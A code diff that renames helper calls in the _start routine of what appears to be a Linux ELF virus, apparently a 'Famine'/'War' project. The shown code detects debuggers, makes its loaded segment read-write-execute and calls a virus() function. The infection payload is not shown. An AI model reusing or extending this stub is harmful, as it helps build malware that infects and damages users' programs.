@@ -19,19 +19,19 @@
 void	_start(void)
 {
 	if (detect_spy())
-		famine_exit(ft_putstr("spy detected!\n"));
+		sys_exit(ft_putstr("spy detected!\n"));
 
-	struct safe_pointer	safe_ptr;
-	if (!original_accessor(&safe_ptr, "./war"))
-		famine_exit(ft_putstr("failed to create safe accessor for file ./war\n"));
+	struct safe_ptr	safe_ptr;
+	if (!init_original_safe(&safe_ptr, "./war"))
+		sys_exit(ft_putstr("failed to create safe accessor for file ./war\n"));
 
 	struct entry		file_info;
 	if (!find_entry(&file_info, safe_ptr))
-		famine_exit(ft_putstr("failed to find entry\n"));
+		sys_exit(ft_putstr("failed to find entry\n"));
 
 	struct elf64_hdr	*elf_hdr = safe_accessor(0, sizeof(*elf_hdr), safe_ptr);
 	if (elf_hdr == NULL)
-		famine_exit(ft_putstr("failed to read elf header\n"));
+		sys_exit(ft_putstr("failed to read elf header\n"));
 
 	size_t	p_vaddr         = file_info.safe_phdr->p_vaddr;
 	size_t	entry_vaddr     = elf_hdr->e_entry;
@@ -41,12 +41,12 @@ void	_start(void)
 	size_t	pt_load_size  = file_info.safe_phdr->p_memsz;
 	int	prot_rwx      = 0x07;
 
-	if (famine_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
-		famine_exit(ft_putstr("failed to read elf header\n"));
+	if (sys_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
+		sys_exit(ft_putstr("failed to read elf header\n"));
 
 	uint64_t seed[2] = {0l, ~0l};
 
 	virus(seed);
-	famine_exit(0);
+	sys_exit(0);
 	__builtin_unreachable();
 }
